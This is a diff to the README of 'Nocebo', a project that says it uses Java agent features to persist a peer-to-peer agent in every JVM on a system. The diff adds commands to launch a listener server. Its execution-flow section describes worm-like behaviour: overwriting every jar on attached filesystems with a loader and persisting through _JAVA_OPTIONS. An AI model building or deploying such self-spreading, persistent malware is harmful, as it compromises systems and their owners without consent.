@@ -8,6 +8,12 @@ Nocebo exploits javaagent features to persist a P2P agent in all jvms executed o
 
 It is strongly recommended that you execute this in a vm or on a system that can safely have java files moved around. 
 
+To execute the server, run...
+```
+cd server\listener
+& 'C:\Program Files\Java\jdk-23\bin\java.exe' -jar .\target\listener-0.0.1-SNAPSHOT.jar
+```
+
 # Execution flow
  - A nocebo instance's autolib.replcate function discovers an attached root filesystem and performs a backup => overwrite operation on all the jars it can find, where the replacement jar is the iLoader javaagent component
  - A program executes the iLoader from the filesystem (potentially even a net share), triggering the main method and instantiating persistence in the _JAVA_OPTIONS env var
